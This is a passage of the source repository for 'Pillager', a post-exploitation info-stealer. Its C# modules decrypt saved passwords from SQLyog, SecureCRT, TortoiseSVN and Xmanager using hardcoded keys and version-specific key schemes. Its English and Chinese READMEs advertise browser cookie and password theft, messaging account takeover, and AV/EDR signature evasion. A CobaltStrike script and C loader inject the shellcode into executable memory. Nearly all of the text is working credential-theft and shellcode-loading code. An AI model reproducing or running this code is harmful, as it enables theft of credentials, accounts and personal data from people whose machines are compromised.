        private static byte[] keyArray = { 0x29, 0x23, 0xBE, 0x84, 0xE1, 0x6C, 0xD6, 0xAE, 0x52, 0x90, 0x49, 0xF1, 0xC9, 0xBB, 0x21, 0x8F };
        private static byte[] ivArray = { 0xB3, 0xA6, 0xDB, 0x3C, 0x87, 0x0C, 0x3E, 0x99, 0x24, 0x5E, 0x0D, 0x1C, 0x06, 0xB7, 0x47, 0xDE };
        private static string OldDecrypt(string text)
        {
            byte[] bytes = Convert.FromBase64String(text);
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = ((byte)(((bytes[i]) << (1)) | ((bytes[i]) >> (8 - (1)))));
            }
            return Encoding.UTF8.GetString(bytes);
        }

        private static string NewDecrypt(string text)
        {
            byte[] bytes = Convert.FromBase64String(text);
            byte[] bytespad = new byte[128];
            Array.Copy(bytes, bytespad, bytes.Length);
            RijndaelManaged rDel = new RijndaelManaged();
            rDel.Key = keyArray;
            rDel.IV = ivArray;
            rDel.BlockSize = 128;
            rDel.Mode = CipherMode.CFB;
            rDel.Padding = PaddingMode.None;
            ICryptoTransform cTransform = rDel.CreateDecryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(bytespad, 0, bytespad.Length).Take(bytes.Length).ToArray();
            return Encoding.UTF8.GetString(resultArray);
        }

        private static string Decrypt(string path)
        {
            Pixini p = Pixini.Load(path);
            Dictionary<string, List<IniLine>> sectionMap = p.sectionMap;
            foreach (var item in sectionMap)
            {
                List<IniLine> iniLines = item.Value;
                bool encrypted = false;
                string encryptedpassword = "";
                foreach (var line in iniLines)
                {
                    if (line.key == "Password")
                        encryptedpassword = line.value;
                    if (line.key == "Isencrypted") encrypted = (line.value == "1");
                }
                if (string.IsNullOrEmpty(encryptedpassword)) continue;
                string password = encrypted ? NewDecrypt(encryptedpassword) : OldDecrypt(encryptedpassword);
                p.Set("Password", item.Key, password);
            }
            return p.ToString();
        }


        public static void Save(string path)
        {
            try
            {
                string inipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SQLyog\\sqlyog.ini");
                if (!File.Exists(inipath)) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                File.Copy(inipath, Path.Combine(savepath, "sqlyog.ini"));
                File.WriteAllText(Path.Combine(savepath, "sqlyog_decrypted.ini"), Decrypt(inipath));
            }
            catch { }
        }
    }
}

```

`Pillager/Tools/SecureCRT.cs`:

```cs
using Microsoft.Win32;
using Pillager.Helper;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Tools
{
    internal class SecureCRT
    {
        public static string ToolName = "SecureCRT";

        public static string DecryptV2(string input, string passphrase = "")
        {
            try
            {
                if (!input.StartsWith("02") && !input.StartsWith("03")) return "";
                bool v3 = input.StartsWith("03");
                input = input.Substring(3);
                byte[] keyBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(passphrase));
                byte[] iv = new byte[16];
                byte[] array = fromhex(input);
                if (v3)
                {
                    byte[] ciphertext_bytes = new byte[array.Length - 16];
                    byte[] salt = new byte[16];
                    Array.Copy(array, 0, salt, 0, 16);
                    Array.Copy(array, 16, ciphertext_bytes, 0, array.Length - 16);
                    array = ciphertext_bytes;

                    Bcrypt b = new Bcrypt();
                    var bytes = b.BcryptPbkdf("", salt, 16, 48);
                    keyBytes = new byte[32];
                    Array.Copy(bytes, 0, keyBytes, 0, 32);
                    Array.Copy(bytes, 32, iv, 0, 16);
                }

                byte[] decrypted;
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                    {
                        rijndaelManaged.KeySize = 256;
                        rijndaelManaged.BlockSize = 128;
                        rijndaelManaged.Key = keyBytes;
                        rijndaelManaged.IV = iv;
                        rijndaelManaged.Mode = CipherMode.CBC;
                        rijndaelManaged.Padding = PaddingMode.Zeros;
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(array, 0, array.Length);
                            cryptoStream.Close();
                        }
                        decrypted = memoryStream.ToArray();
                    }
                }
                if (decrypted.Length < 4) return "";
                int num = BitConverter.ToInt32(new byte[4]
                {
                    decrypted[0],
                    decrypted[1],
                    decrypted[2],
                    decrypted[3]
                }, 0);
                if (decrypted.Length < 4 + num + 32) return "";

                byte[] array3 = new byte[num];
                byte[] array4 = new byte[32];
                byte[] a_ = new byte[32];
                Array.Copy(decrypted, 4, array3, 0, num);
                Array.Copy(decrypted, 4 + num, array4, 0, 32);
                using (SHA256 sHA = SHA256.Create())
                {
                    a_ = sHA.ComputeHash(array3);
                }
                if (a_.Length != array4.Length) return "";
                for (int i = 0; i < a_.Length; i++)
                {
                    if (a_[i] != array4[i])
                        return "";
                }
                return Encoding.UTF8.GetString(array3);
            }
            catch
            {
                return "";
            }
        }

        private static byte[] fromhex(string hex)
        {
            byte[] mybyte = new byte[int.Parse(Math.Ceiling(hex.Length / 2.0).ToString())];
            for (int i = 0; i < mybyte.Length; i++)
            {
                int len = 2 <= hex.Length ? 2 : hex.Length;
                mybyte[i] = Convert.ToByte(hex.Substring(0, len), 16);
                hex = hex.Substring(len, hex.Length - len);
            }
            return mybyte;
        }

        public static string Decrypt(string str)
        {
            byte[] IV = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            byte[] Key1 = { 0x24, 0xa6, 0x3d, 0xde, 0x5b, 0xd3, 0xb3, 0x82, 0x9c, 0x7e, 0x06, 0xf4, 0x08, 0x16, 0xaa, 0x07 };
            byte[] Key2 = { 0x5f, 0xb0, 0x45, 0xa2, 0x94, 0x17, 0xd9, 0x16, 0xc6, 0xc6, 0xa2, 0xff, 0x06, 0x41, 0x82, 0xb7 };
            byte[] ciphered_bytes = fromhex(str);
            if (ciphered_bytes.Length <= 8) return null;

            Blowfish algo = new Blowfish();
            algo.InitializeKey(Key1);
            algo.SetIV(IV);
            byte[] decryptedTxt = new byte[ciphered_bytes.Length];
            algo.DecryptCBC(ciphered_bytes, 0, ciphered_bytes.Length, decryptedTxt, 0);
            decryptedTxt = decryptedTxt.Skip(4).Take(decryptedTxt.Length - 8).ToArray();

            algo = new Blowfish();
            algo.InitializeKey(Key2);
            algo.SetIV(IV);
            algo.DecryptCBC(decryptedTxt, 0, decryptedTxt.Length, ciphered_bytes, 0);
            string ciphered = Encoding.Unicode.GetString(ciphered_bytes).Split('\0')[0];
            return ciphered;
        }

        public static string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string name = "Software\\VanDyke\\SecureCRT";
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
            if (registryKey == null) return "";
            string path = Path.Combine(registryKey.GetValue("Config Path").ToString(), "Sessions");
            if (Directory.Exists(path))
            {
                FileInfo[] files = new DirectoryInfo(path).GetFiles("*.ini", SearchOption.AllDirectories);
                foreach (FileInfo fileInfo in files)
                {
                    if (fileInfo.Name.ToLower().Equals("__FolderData__.ini".ToLower())) continue;
                    foreach (string line in File.ReadAllLines(fileInfo.FullName))
                    {
                        if (line.IndexOf('=') != -1)
                        {
                            string text3 = line.Split('=')[0];
                            string a_2 = line.Split('=')[1];
                            if (text3.ToLower().Contains("S:\"Password\"".ToLower()))
                            {
                                sb.AppendLine("S:\"Password\"=" + Decrypt(a_2));
                            }
                            else if (text3.ToLower().Contains("S:\"Password V2\"".ToLower()))
                            {
                                sb.AppendLine("S:\"Password V2\"=" + DecryptV2(a_2));
                            }
                            else
                            {
                                sb.AppendLine(line);
                            }
                        }
                    }
                }
            }

            return sb.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (string.IsNullOrEmpty(output)) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
            }
            catch { }
        }
    }
}

```

`Pillager/Tools/TortoiseSVN.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Tools
{
    internal class TortoiseSVN
    {
        public static string ToolName = "TortoiseSVN";

        public static string Decrypt(string input)
        {
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(input), null,
                    DataProtectionScope.CurrentUser));
            }
            catch
            {
                return input;
            }
        }

        public static void Save(string path)
        {
            try
            {
                string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Subversion\\auth\\svn.simple");
                if (!Directory.Exists(folder)) return;
                string[] files = Directory.GetFiles(folder, new String('?', 32));
                if (files.Length == 0) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                foreach (string file in files)
                {
                    string[] lines = File.ReadAllLines(file);
                    bool encrypted = false;
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i] == "passtype" && i > 1 && lines[i - 1].StartsWith("K ") && i + 2 < lines.Length && lines[i + 2] == "wincrypt")
                        {
                            encrypted = true;
                        }
                    }
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i] == "password" && i > 1 && lines[i - 1].StartsWith("K ") && i + 2 < lines.Length && encrypted)
                        {
                            lines[i + 2] = Decrypt(lines[i + 2]);
                        }
                    }
                    File.WriteAllLines(Path.Combine(savepath, "svn.simple.decrypted"), lines);
                }
            }
            catch { }
        }
    }
}

```

`Pillager/Tools/Xmanager.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using Pillager.Helper;

namespace Pillager.Tools
{
    internal static class Xmanager
    {
        public static string ToolName = "Xmanager";

        public static List<string> sessionFiles = new List<string>();

        public static void GetAllAccessibleFiles(string rootPath)
        {
            DirectoryInfo di = new DirectoryInfo(rootPath);
            var dirs = di.GetDirectories();
            foreach (DirectoryInfo dir in dirs)
            {
                try
                {
                    GetAllAccessibleFiles(dir.FullName);
                }
                catch { }
            }
            var files = Directory.GetFiles(rootPath);
            foreach (string file in files)
            {
                if (file.Contains(".xsh")|| file.Contains(".xfp")) sessionFiles.Add(file);
            }
        }

        public static string DecryptSessions()
        {
            StringBuilder sb = new StringBuilder();
            WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
            string sid = currentUser.User.ToString();
            string userName = currentUser.Name.Split('\\')[1];

            foreach (string sessionFile in sessionFiles)
            {
                List<string> configs = ReadConfigFile(sessionFile);
                if (configs.Count < 4) continue;
                sb.AppendLine("Session File: " + sessionFile);
                sb.Append("Version: " + configs[0]);
                sb.Append("Host: " + configs[1]);
                sb.Append("UserName: " + configs[2]);
                sb.Append("rawPass: " + configs[3]);
                sb.AppendLine("UserName: " + userName);
                sb.AppendLine("Sid: " + sid);
                sb.AppendLine(Decrypt(userName, sid, configs[3], configs[0].Replace("\r", "")));
                sb.AppendLine();
            }

            return sb.ToString();
        }

        static List<string> ReadConfigFile(string path)
        {
            string fileData = File.ReadAllText(path);
            string Version = null;
            string Host = null;
            //string Port = null;
            string Username = null;
            string Password = null;
            List<string> resultString = new List<string>();

            try
            {
                Version = Regex.Match(fileData, "Version=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Host = Regex.Match(fileData, "Host=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Username = Regex.Match(fileData, "UserName=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Password = Regex.Match(fileData, "Password=(.*)", RegexOptions.Multiline).Groups[1].Value;
            }
            catch
            { }
            resultString.Add(Version);
            resultString.Add(Host);
            resultString.Add(Username);
            if (Password.Length > 3)
            {
                resultString.Add(Password);
            }


            return resultString;
        }

        static string Decrypt(string username, string sid, string rawPass, string ver)
        {
            if (ver.StartsWith("5.0") || ver.StartsWith("4") || ver.StartsWith("3") || ver.StartsWith("2"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&"));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                return("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
            }

            if (ver.StartsWith("5.1") || ver.StartsWith("5.2"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(sid));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                return ("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
            }

            if (ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(username + sid));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                return ("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
            }

            if (ver.StartsWith("7"))
            {
                string strkey1 = new string(username.ToCharArray().Reverse().ToArray()) + sid;
                string strkey2 = new string(strkey1.ToCharArray().Reverse().ToArray());

                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(strkey2));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                return ("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
            }
            return "";
        }

        public static void Save(string path)
        {
            try
            {
                GetAllAccessibleFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                if (sessionFiles.Count == 0) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                string output = DecryptSessions();
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
            }
            catch { }
        }
    }
}

```

`Pillager/app.config`:

```config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
<startup><supportedRuntime version="v2.0.50727"/></startup></configuration>

```

`README.md`:

```md
# Pillager

[![License](https://img.shields.io/github/license/qwqdanchun/Pillager.svg)](LICENSE)
![GitHub last commit](https://img.shields.io/github/last-commit/qwqdanchun/Pillager)
![GitHub release (latest by date)](https://img.shields.io/github/v/release/qwqdanchun/Pillager)
[![Downloads](https://img.shields.io/github/downloads/qwqdanchun/Pillager/total.svg)](https://github.com/qwqdanchun/Pillager/releases)
![Issues](https://img.shields.io/github/issues/qwqdanchun/Pillager)

<img src=".\Pillager.png"/>

[中文说明](./README_ZH.md)

## Introduction

Pillager is a tool for exporting and decrypting useful data from target computer.

## Support

#### Browser

| Browser Name  | BookMarks | Cookies | Passwords | Historys | Local Storage | Extension Settings |
| :------------ | :-------: | :-----: | :-------: | :------: | :-----------: | :----------------: |
| IE            |    ✅    |   ❌   |    ✅    |    ✅    |      ❌      |         ❌         |
| Edge          |    ✅    |   ✅   |    ✅    |    ✅    |      ✅      |         ✅         |
| Chrome        |    ✅    |   ✅   |    ✅    |    ✅    |      ✅      |         ✅         |
| Chrome Beta   |    ✅    |   ✅   |    ✅    |    ✅    |      ✅      |         ✅         |
| Chrome SxS    |    ✅    |   ✅   |    ✅    |    ✅    |      ✅      |         ✅         |
| Chromium      |    ✅    |   ✅   |    ✅    |    ✅    |      ✅      |         ✅         |
| Brave-Browser |    ✅    |   ✅   |    ✅    |    ✅    |      🚧      |         🚧         |
| QQBrowser     |    ✅    |   ✅   |    ✅    |    ✅    |      ✅      |         ✅         |
| SogouExplorer |    ✅    |   ✅   |    ✅    |    ✅    |      🚧      |         🚧         |
| 360Chrome     |    ❌    |   ✅   |    ✅    |    ❌    |      ✅      |         ✅         |
| 360ChromeX    |    ❌    |   ✅   |    ✅    |    ❌    |      ✅      |         ✅         |
| Vivaldi       |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| CocCoc        |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Torch         |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Kometa        |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Orbitum       |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| CentBrowser   |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| 7Star         |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Sputnik       |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Epic Privacy  |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Uran          |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Yandex        |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Opera         |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| Opera GX      |    🚧    |   🚧   |    🚧    |    🚧    |      🚧      |         🚧         |
| FireFox       |    ✅    |   ✅   |    ✅    |    ✅    |      ❌      |         ✅         |

✅ Support,🚧 Haven't Tested,❌ Not Support

#### Software

* Acount Takeover
  * Telegram
  * Skype
  * Enigma
  * DingTalk
  * Line
  * Discord
  * MailMaster
  * Foxmail
  * FileZilla
* Password Recovery
  * MobaXterm
  * Xmanager
  * RDCMan
  * FinalShell
  * Navicat
  * SQLyog
  * SecureCRT
  * Outlook
  * MailBird
  * WinSCP
  * DBeaver
  * CoreFTP
  * Snowflake
* Personal Infomation
  * QQ
  * VSCode
  * Netease CloudMusic

Will add more ......

#### System

* Wifi
* ScreenShot
* InstalledApp

## Usage

This project uses Github Action to auto build and upload the [Release](https://github.com/qwqdanchun/Pillager/releases)

* [Pillager.exe](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/Pillager.exe) is exe for .Net Framework v3.5
* [Pillager.bin](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/Pillager.bin) is shellcode built with Donut
* [cs-plugin.zip](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/cs-plugin.zip) is plugin for CobaltStrike

Pillager.exe is just for testing. It will be detect as malware by most Anti-Virus softwares.

Run the shellcode in your way, and find the result at `%Temp%\Pillager.zip`.

## Feature

* Shellcode file size is less than 100kb
* Using self version of Donut，shellcode is suitable for both .Net Framework v3.5/v4.x

## Contributors

<a href="https://github.com/qwqdanchun/Pillager/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=qwqdanchun/Pillager" />
</a>

## 404 StarLink Project

![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

Pillager has joined [404星链计划](https://github.com/knownsec/404StarLink)

```

`README_ZH.md`:

```md
# Pillager

[![License](https://img.shields.io/github/license/qwqdanchun/Pillager.svg)](LICENSE)
![GitHub last commit](https://img.shields.io/github/last-commit/qwqdanchun/Pillager)
![GitHub release (latest by date)](https://img.shields.io/github/v/release/qwqdanchun/Pillager)
[![Downloads](https://img.shields.io/github/downloads/qwqdanchun/Pillager/total.svg)](https://github.com/qwqdanchun/Pillager/releases)
![Issues](https://img.shields.io/github/issues/qwqdanchun/Pillager)

<img src=".\Pillager.png"/>

## 介绍

Pillager是一个适用于后渗透期间的信息收集工具，可以收集目标机器上敏感信息，方便下一步渗透工作的进行。

## 支持

#### 浏览器

| 名称          | 书签 | Cookies | 密码 | 历史记录 | Local Storage | Extension Settings |
| :------------ | :--: | :-----: | :--: | :------: | :-----------: | :----------------: |
| IE            |  ✅  |   ❌   |  ✅  |    ✅    |      ❌      |         ❌         |
| Edge          |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Chrome        |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Chrome Beta   |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Chrome SxS    |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Chromium      |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Brave-Browser |  ✅  |   ✅   |  ✅  |    ✅    |      🚧      |         🚧         |
| QQBrowser     |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| SogouExplorer |  ✅  |   ✅   |  ✅  |    ✅    |      🚧      |         🚧         |
| 360Chrome     |  ❌  |   ✅   |  ✅  |    ❌    |      ✅      |         ✅         |
| 360ChromeX    |  ❌  |   ✅   |  ✅  |    ❌    |      ✅      |         ✅         |
| Vivaldi       |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| CocCoc        |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Torch         |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Kometa        |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Orbitum       |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| CentBrowser   |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| 7Star         |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Sputnik       |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Epic Privacy  |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Uran          |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Yandex        |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Opera         |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Opera GX      |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| FireFox       |  ✅  |   ✅   |  ✅  |    ✅    |      ❌      |         ✅         |

注：✅表示经过测试，🚧表示理论上支持但未经测试，❌表示无此功能或不支持

#### 软件

* 账户接管
  * Telegram
  * Skype
  * Enigma
  * 钉钉
  * Line
  * Discord
  * 网易邮箱大师
  * Foxmail
  * FileZilla
* 凭据提取
  * MobaXterm
  * Xmanager
  * RDCMan
  * FinalShell
  * Navicat
  * SQLyog
  * SecureCRT
  * Outlook
  * MailBird
  * WinSCP
  * DBeaver
  * CoreFTP
  * Snowflake
* 个人信息
  * QQ
  * VSCode
  * 网易云音乐

后续将会陆续添加支持的软件

#### System

* Wifi
* 截屏
* 已安装应用

## 使用方法

此项目使用Github Action自动编译打包，并上传至[Release](https://github.com/qwqdanchun/Pillager/releases)，其中

* [Pillager.exe](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/Pillager.exe) 为.Net Framework v3.5编译生成的exe
* [Pillager.bin](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/Pillager.bin) Donut打包的raw格式的shellcode
* [cs-plugin.zip](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/cs-plugin.zip) 为适用于CobaltStrike使用的插件

使用CobaltStrike可以直接下载插件包，其他人推荐将shellcode集成至自己的加载器或工具中运行，不建议直接使用Pillager.exe

执行后会将文件打包至 `%Temp%\Pillager.zip`，需要自行前往目录下载文件或修改代码将文件上传至他处

## 优点

* 体积在100kb左右，为同类工具体积的几分之一甚至几十分之一
* 支持大部分常见浏览器，常见聊天软件的信息提取，将陆续添加其他常用工具的信息收集
* 长期维护，有问题可以及时的反馈处理
* 使用魔改版本的Donut，缩小shellcode体积，使shellcode兼容.Net Framework v3.5/v4.x，并去除AV/EDR对Donut提取的特征

## Contributors

<a href="https://github.com/qwqdanchun/Pillager/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=qwqdanchun/Pillager" />
</a>

## 404星链计划

![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

Pillager 现已加入 [404星链计划](https://github.com/knownsec/404StarLink)

```

`cs-plugin/browser.cna`:

```cna
beacon_command_register(
"Pillager", 
"Get Browser Password", 
"Usage: Pillager");

alias Pillager {
    $bid = $1;
	$barch  = barch($bid);

    $handle1 = openf(script_resource("module/scloader. $+ $barch $+ .o"));
    $data1   = readb($handle1, -1);
    closef($handle1);

    $handle2 = openf(script_resource("module/Pillager.bin"));
    $data2   = readb($handle2, -1);
    closef($handle2);


    $args   = bof_pack($bid, "b", $data2);
    beacon_inline_execute($bid, $data1, "go", $args);
    btask($bid, "Results can be found at %temp%\\Pillager.zip");

}

```

`cs-plugin/module/scloader.c`:

```c
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID   WINAPI   KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL     WINAPI   KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess (VOID);

VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    datap   parser;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    LPVOID pMem;
    SIZE_T bytesWritten = 0;
    DWORD dwThreadId = 0;

    BeaconDataParse(&parser, Buffer, Length);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
    pMem = KERNEL32$VirtualAlloc(0, dwShellcodeBufferSize,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    KERNEL32$WriteProcessMemory(KERNEL32$GetCurrentProcess(), pMem, lpShellcodeBuffer, dwShellcodeBufferSize, &bytesWritten);
    KERNEL32$CreateThread(0, 0, pMem, 0, 0, &dwThreadId);
}
```